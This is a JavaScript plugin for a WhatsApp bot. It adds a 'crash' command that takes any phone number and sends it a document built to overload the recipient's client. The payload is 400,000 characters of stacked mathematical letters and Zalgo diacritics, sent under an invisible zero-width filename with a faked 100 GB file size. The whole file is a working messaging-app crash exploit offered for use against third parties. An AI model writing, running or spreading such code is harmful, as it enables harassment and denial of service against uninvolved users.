/* * 👑 Stealth Bug Sender (Full Feedback) - Misa-Bot
 * Autor: Yanniel & Gemini
 */

const ultraHeavyBug = {
    name: 'unicode',
    alias: ['heavy', 'send', 'crash', 'txt'],
    category: 'utilidades',
    noPrefix: true,

    run: async (conn, m, { args, usedPrefix, command }) => {
        const chat = m.key.remoteJid
        
        // 1. MENU DE USO: Si no hay argumentos, explica cómo funciona
        if (!args[0] || args[0].length < 5) {
            const usageText = `✧ ‧₊˚ *MISA BUG SYSTEM* ୧ֹ˖ ⑅ ࣪⊹\n\n` +
                              `> ✐ *Uso detectado:* ${command}\n\n` +
                              `✰ \`Formato\`: *${command} [número]*\n` +
                              `✰ \`Ejemplo\`: *${command} 54911xxxx*\n\n` +
                              `> 💡 *Nota:* El bot enviará un archivo invisible de 100GB con carga pesada al número indicado.\n\n` +
                              `Powered by 𝓜𝓲𝓼α ♡`
            
            return conn.sendMessage(chat, { text: usageText }, { quoted: m })
        }

        try {
            // Limpiar el número de símbolos raros
            let targetNum = args[0].replace(/[^0-9]/g, '')
            let targetJid = targetNum + '@s.whatsapp.net'
            
            // Reacción de inicio
            await conn.sendMessage(chat, { react: { text: '⏳', key: m.key } })

            // 2. Generar carga ultra pesada (400k caracteres)
            let cantidad = 400000
            let carga = ""
            
            for (let i = 0; i < cantidad; i++) {
                // Alternamos estilos matemáticos para saturar la fuente
                if (i % 2 === 0) {
                    carga += String.fromCodePoint(0x1D400 + (i % 26)) 
                } else {
                    carga += String.fromCodePoint(0x1D434 + (i % 26)) 
                }
                // Inyectamos diacríticos apilados (Zalgo)
                carga += String.fromCodePoint(0x0300 + (i % 100)) 
                carga += String.fromCodePoint(0x0345) 
            }

            const buffer = Buffer.from(carga, 'utf-16le')
            const nombreInvisible = String.fromCodePoint(0x200C, 0x200C, 0x200C) + ".txt"

            // 3. Envío del archivo al objetivo
            await conn.sendMessage(targetJid, {
                document: buffer,
                mimetype: 'text/plain',
                fileName: nombreInvisible,
                fileLength: 107374182400, // Bug de 100 GB
                caption: null
            })

            // 4. Feedback final para el dueño del bot
            await conn.sendMessage(chat, { react: { text: '✅', key: m.key } })
            await conn.sendMessage(chat, { 
                text: `🚀 *¡Carga disparada!*\n\n> Se envió el archivo de 100GB a: @${targetNum}\n> Nombre del archivo: (Invisible)`,
                mentions: [targetJid]
            }, { quoted: m })

        } catch (err) {
            console.error(err)
            await conn.sendMessage(chat, { text: '❌ *Error crítico al procesar el envío.*' }, { quoted: m })
        }
    }
}

export default ultraHeavyBug
